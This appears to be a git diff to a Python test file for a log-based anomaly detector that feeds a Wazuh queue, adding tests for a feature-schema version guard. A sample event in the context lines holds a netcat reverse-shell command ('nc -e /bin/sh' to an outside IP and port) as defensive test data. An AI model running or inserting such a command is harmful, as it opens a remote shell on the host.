@@ -4,12 +4,19 @@ import json
 import socket
 from pathlib import Path
 
+import pytest
 import torch
 
-from src.features import LogVectorizer
+from src.features import FEATURE_SCHEMA_VERSION, LogVectorizer
 from src.injector import QUEUE_PREFIX, WazuhSocketInjector
 from src.model import LogAutoencoder
-from src.pipeline import process_line, reconstruction_details, reconstruction_error
+from src.pipeline import (
+    FeatureSchemaMismatch,
+    ensure_schema_compatibility,
+    process_line,
+    reconstruction_details,
+    reconstruction_error,
+)
 from src.sanitizer import ISOSanitizer
 
 INPUT_DIM = 64
@@ -24,6 +31,21 @@ def _sample_event_line() -> str:
             "data": {"command": "nc -e /bin/sh 8.8.8.8 4444", "process_name": "nc"},
         }
     )
+
+
+def test_schema_guard_accepts_a_matching_model() -> None:
+    ensure_schema_compatibility({"feature_schema_version": FEATURE_SCHEMA_VERSION})
+
+
+def test_schema_guard_rejects_weights_from_another_layout() -> None:
+    """A mismatched layout scores silently and meaninglessly, so refuse to run."""
+    with pytest.raises(FeatureSchemaMismatch, match="schema v1"):
+        ensure_schema_compatibility({"feature_schema_version": 1})
+
+
+def test_schema_guard_rejects_a_config_predating_versioning() -> None:
+    with pytest.raises(FeatureSchemaMismatch, match="no feature_schema_version"):
+        ensure_schema_compatibility({"anomaly_threshold_tau": 0.07})
 
 
 def test_reconstruction_error_returns_non_negative_float() -> None:
